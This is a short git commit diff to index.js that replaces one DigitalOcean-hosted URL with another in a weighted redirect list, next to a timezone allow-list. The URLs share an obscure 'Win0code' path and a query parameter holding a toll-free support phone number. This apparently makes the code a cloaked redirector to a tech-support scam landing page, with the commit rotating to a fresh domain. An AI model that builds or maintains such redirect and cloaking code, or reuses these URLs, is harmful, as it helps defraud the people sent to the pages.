dbd9bbfd28d0098026e350620c51d1508a1b9948
paalakash <palaksh452@gmail.com>
2026-06-16 10:02:59 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://octopus-app-2-3ljva.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3306", weight: 1.0 }
+    { url: "https://oyster-app-g6mpc.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3306", weight: 1.0 }
 
 ];
 
